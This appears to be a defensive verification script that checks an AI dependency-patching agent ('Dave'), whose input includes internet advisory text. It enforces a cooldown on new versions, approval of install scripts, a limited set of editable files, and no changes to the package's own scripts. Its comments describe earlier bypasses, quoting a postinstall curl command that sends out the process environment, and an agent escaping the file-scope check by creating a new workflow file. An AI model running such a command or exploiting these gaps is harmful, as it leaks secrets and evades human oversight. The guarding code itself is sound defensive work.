#!/usr/bin/env node
/**
 * dave-verify — independently verify whatever Dave changed.
 * ========================================================
 *
 * This is the trust boundary. Dave's triage step runs a model against advisory
 * text pulled from the internet, so its output is *a proposal*, never a fact.
 * This script re-derives the truth from the working tree and fails the run if
 * the proposal violates lab policy — regardless of what the model claimed.
 *
 * It answers four questions, none of which require trusting the model:
 *
 *   1. Did every changed dependency version clear the supply-chain cooldown?
 *      (Advisory-driven fixes are exempt — same carve-out as dependabot.yml.)
 *   2. Did the change introduce a package that runs install scripts without
 *      also approving it in package.json allowScripts?
 *   3. Did the change add a NEW direct dependency? Dave patches; he does not
 *      get to expand the attack surface on his own.
 *   4. Did the change touch anything outside Dave's remit (workflows, CI
 *      identity, secrets config)?
 *
 * Usage
 * -----
 *   node scripts/dave-verify.mjs --base <git-ref> [--report .dave/out/report.json]
 *
 * Exit codes
 * ----------
 *   0  the change is within policy
 *   1  policy violation — the caller must open a DRAFT PR / block the merge
 *   2  the verification could not be performed
 */

import { execFileSync } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import { FRAMEWORK_TIER } from './dave-scan-lib.mjs';

const argv = process.argv.slice(2);
const flag = (name, fallback = null) => {
  const i = argv.indexOf(`--${name}`);
  return i !== -1 && argv[i + 1] && !argv[i + 1].startsWith('--') ? argv[i + 1] : fallback;
};

const BASE = flag('base');
const REPORT_PATH = flag('report', '.dave/out/report.json');

if (!BASE) {
  console.error('dave-verify: --base <git-ref> is required');
  process.exit(2);
}

const violations = [];
const notes = [];

const readJson = (path) => {
  try {
    return JSON.parse(readFileSync(path, 'utf8'));
  } catch {
    return null;
  }
};

/** Read a file as it existed at BASE. Returns null if it did not exist. */
const gitShow = (path) => {
  try {
    return execFileSync('git', ['show', `${BASE}:${path}`], {
      encoding: 'utf8',
      maxBuffer: 64 * 1024 * 1024,
      stdio: ['ignore', 'pipe', 'ignore'],
    });
  } catch {
    return null;
  }
};

const readCooldownDays = () => {
  if (!existsSync('.npmrc')) return 0;
  const m = readFileSync('.npmrc', 'utf8').match(/^\s*min-release-age\s*=\s*(\d+)/m);
  return m ? Number(m[1]) : 0;
};
const COOLDOWN_DAYS = readCooldownDays();

// Packages that a published advisory says we must move off of. These may skip
// the cooldown: shipping a known-vulnerable version for another week is worse
// than adopting a fresh one.
const report = readJson(REPORT_PATH);
const exemptPackages = new Set(
  (report?.findings || [])
    .filter((f) => f.source === 'npm-audit' || f.source === 'osv-scanner')
    .map((f) => f.package)
    .filter(Boolean),
);

/** { "node_modules/foo": "1.2.3" } for every resolved package in a lockfile. */
const lockVersions = (lockText) => {
  const out = new Map();
  if (!lockText) return out;
  let lock;
  try {
    lock = JSON.parse(lockText);
  } catch {
    return out;
  }
  for (const [path, meta] of Object.entries(lock.packages || {})) {
    if (!path || !meta?.version) continue;
    out.set(path, meta.version);
  }
  return out;
};

/** name@version for every package in a lockfile that runs install scripts. */
const lockInstallScriptKeys = (lockText) => {
  const keys = new Set();
  if (!lockText) return keys;
  let lock;
  try {
    lock = JSON.parse(lockText);
  } catch {
    return keys;
  }
  for (const [path, meta] of Object.entries(lock.packages || {})) {
    if (!meta?.hasInstallScript || !meta.version) continue;
    const name = path.split('node_modules/').pop();
    if (name) keys.add(`${name}@${meta.version}`);
  }
  return keys;
};

const pkgName = (lockPath) => lockPath.split('node_modules/').pop();

const fetchPublishTime = async (name, version) => {
  try {
    const res = await fetch(`https://registry.npmjs.org/${name.replace('/', '%2f')}`, {
      headers: { accept: 'application/json' },
    });
    if (!res.ok) return null;
    const doc = await res.json();
    return doc.time?.[version] || null;
  } catch {
    return null;
  }
};

const ageInDays = (iso) => {
  if (!iso) return null;
  const t = Date.parse(iso);
  return Number.isNaN(t) ? null : Math.floor((Date.now() - t) / 86_400_000);
};

const main = async () => {
  // ── 1. Cooldown on every changed version ────────────────────────────────
  const baseLockText = gitShow('package-lock.json');
  const headLockText = existsSync('package-lock.json')
    ? readFileSync('package-lock.json', 'utf8')
    : null;

  if (!headLockText) {
    console.error('dave-verify: package-lock.json is missing from the working tree');
    process.exit(2);
  }

  const headPkgRaw = JSON.parse(readFileSync('package.json', 'utf8'));

  const before = lockVersions(baseLockText);
  const after = lockVersions(headLockText);

  // One check per (name, version) pair, not per lockfile path — a single
  // package can appear at many paths.
  const changed = new Map();
  for (const [path, version] of after) {
    if (before.get(path) === version) continue;
    const name = pkgName(path);
    if (!name) continue;
    if (!changed.has(`${name}@${version}`)) changed.set(`${name}@${version}`, { name, version });
  }

  notes.push(`${changed.size} package version(s) changed against ${BASE}`);

  if (COOLDOWN_DAYS > 0 && changed.size > 0) {
    // Bounded concurrency — registry packuments are large.
    const entries = [...changed.values()];
    const LIMIT = 6;
    for (let i = 0; i < entries.length; i += LIMIT) {
      const batch = entries.slice(i, i + LIMIT);
      const results = await Promise.all(
        batch.map(async ({ name, version }) => ({
          name,
          version,
          days: ageInDays(await fetchPublishTime(name, version)),
        })),
      );
      for (const { name, version, days } of results) {
        if (exemptPackages.has(name)) {
          notes.push(`${name}@${version}: cooldown waived (advisory-driven fix)`);
          continue;
        }
        if (days === null) {
          violations.push(
            `${name}@${version}: could not determine publish date — refusing to adopt an unverifiable version`,
          );
          continue;
        }
        if (days < COOLDOWN_DAYS) {
          violations.push(
            `${name}@${version}: published ${days} day(s) ago, cooldown is ${COOLDOWN_DAYS} day(s)`,
          );
        }
      }
    }
  }

  // ── 2. Install scripts vs npm's own allowlist ───────────────────────────
  // package.json's `allowScripts` is the single source of truth — version
  // pinned, and enforced natively by npm >= 11.16. Anything the change adds
  // that runs at install time must be approved there, in the same diff.
  const beforeScripts = lockInstallScriptKeys(baseLockText);
  const afterScripts = lockInstallScriptKeys(headLockText);
  const newScripts = [...afterScripts].filter((k) => !beforeScripts.has(k));

  if (newScripts.length) {
    const approved = new Set(
      Object.entries(headPkgRaw.allowScripts || {})
        .filter(([, v]) => v === true)
        .map(([k]) => k),
    );
    const unapproved = newScripts.filter((k) => !approved.has(k));
    if (unapproved.length) {
      violations.push(
        `install script(s) not approved in package.json allowScripts: ${unapproved.join(', ')}`,
      );
    } else {
      notes.push(`new install-script package(s) approved in allowScripts: ${newScripts.join(', ')}`);
    }
  }

  // ── 3. No new direct dependencies ───────────────────────────────────────
  const basePkg = JSON.parse(gitShow('package.json') || '{}');
  for (const field of ['dependencies', 'devDependencies']) {
    const beforeNames = new Set(Object.keys(basePkg[field] || {}));
    const added = Object.keys(headPkgRaw[field] || {}).filter((n) => !beforeNames.has(n));
    if (added.length) {
      violations.push(`new ${field} added: ${added.join(', ')} — Dave patches, he does not add dependencies`);
    }
  }

  // ── 3b. The root package's own lifecycle scripts ────────────────────────
  // package.json is inside the remit, and check 2 above only inspects install
  // scripts belonging to DEPENDENCIES, read out of the lockfile. Nothing looked
  // at the root package's own `scripts` block — so adding
  //   "postinstall": "curl -d @/proc/self/environ https://…"
  // was a fully in-remit edit that passed every gate and then executed on the
  // next `npm ci`, in a job that goes on to hold a push token.
  //
  // Dave never has a legitimate reason to touch these. Any change at all is a
  // violation, including edits and deletions, not just additions.
  const baseScripts = basePkg.scripts || {};
  const headScripts = headPkgRaw.scripts || {};
  const scriptNames = [...new Set([...Object.keys(baseScripts), ...Object.keys(headScripts)])];
  const scriptChanges = scriptNames.filter((n) => baseScripts[n] !== headScripts[n]);
  if (scriptChanges.length) {
    violations.push(
      `package.json "scripts" modified: ${scriptChanges.join(', ')} — Dave changes dependency ` +
        'versions, never the commands this repo runs',
    );
  }

  // ── 3c. No MAJOR bump of a framework-tier dependency ────────────────────
  // This is the real seam. The remit check (4) only constrains WHICH files
  // change; bumping `next` 15→16 is a package.json + lockfile edit, both inside
  // the remit, so the file-level check waves it through and a reviewer may
  // rubber-stamp "Dave bumped a dep" without registering it is a migration.
  // dave-scan surfaces an available framework major as an advisory-only finding;
  // this makes "Dave never PERFORMS one" true in code rather than by hope. The
  // resolved lockfile version is the exact signal — declared ranges are not.
  const majorOf = (v) => (/^\D*(\d+)/.exec(String(v ?? '')) || [])[1] || null;
  for (const dep of FRAMEWORK_TIER) {
    const key = `node_modules/${dep}`;
    const wasV = before.get(key);
    const nowV = after.get(key);
    const wasMajor = majorOf(wasV);
    const nowMajor = majorOf(nowV);
    if (wasMajor && nowMajor && wasMajor !== nowMajor) {
      violations.push(
        `${dep} ${wasV} → ${nowV} is a MAJOR framework upgrade — a migration Dave may flag ` +
          'but never perform. Take it through a human-reviewed branch, not a nightly fix.',
      );
    }
  }

  // ── 4. Nothing outside Dave's remit ─────────────────────────────────────
  // Dave may edit the dependency manifests. Anything else — especially
  // workflows, which is how an injected instruction would try to escalate — is
  // a human's call.
  const ALLOWED = [/^package\.json$/, /^package-lock\.json$/, /^\.npmrc$/];

  // `git diff` only reports files git already tracks. A file the agent CREATES
  // is invisible to it — so checking the diff alone let a brand-new
  // .github/workflows/*.yml through the remit gate untouched, and the workflow
  // then staged it with `git add -A` and pushed it. Creating was the bypass for
  // a check that only ever looked at editing.
  //
  // `--exclude-standard` is deliberate: it applies .gitignore, which is exactly
  // the set `git add -A` would refuse to stage. Dave's own scratch output under
  // .dave/out/ is ignored and therefore correctly not treated as a violation.
  const trackedEdits = execFileSync('git', ['diff', '--name-only', BASE, '--'], {
    encoding: 'utf8',
  });
  const createdFiles = execFileSync('git', ['ls-files', '--others', '--exclude-standard'], {
    encoding: 'utf8',
  });
  const touched = [
    ...new Set(
      `${trackedEdits}\n${createdFiles}`
        .split('\n')
        .map((s) => s.trim())
        .filter(Boolean),
    ),
  ];
  const outOfScope = touched.filter((f) => !ALLOWED.some((re) => re.test(f)));
  if (outOfScope.length) {
    violations.push(
      `files changed outside Dave's remit: ${outOfScope.slice(0, 20).join(', ')}${
        outOfScope.length > 20 ? ` (+${outOfScope.length - 20} more)` : ''
      }`,
    );
  }

  // ── Verdict ─────────────────────────────────────────────────────────────
  for (const n of notes) console.log(`  ok  ${n}`);
  for (const v of violations) console.error(`  !!  ${v}`);

  if (violations.length) {
    console.error(`\ndave-verify: ${violations.length} policy violation(s) — this change cannot be trusted as-is.`);
    process.exit(1);
  }
  console.log('\ndave-verify: change is within policy.');
  process.exit(0);
};

main().catch((err) => {
  console.error(`dave-verify failed: ${err?.stack || err}`);
  process.exit(2);
});
